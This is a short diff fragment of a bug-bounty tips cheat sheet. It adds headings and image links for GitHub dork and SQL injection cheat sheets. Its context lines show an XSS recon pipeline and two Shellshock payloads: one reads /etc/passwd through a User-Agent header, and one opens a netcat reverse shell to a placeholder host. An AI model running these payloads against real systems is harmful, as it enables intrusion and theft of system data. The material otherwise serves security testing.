@@ -143,3 +143,7 @@ cat target.txt | waybackurls | gf xss | kxss
 User-Agent: () { :;}; echo $(</etc/passwd)
 () { :;}; /usr/bin/nc ip 1337 -e /bin/bash
 ```
+## Github Dorks cheat sheet
+![cheatsheet](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/gitdork.jpg)
+## SQLi
+![sqli](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/sqli-2.jpg)
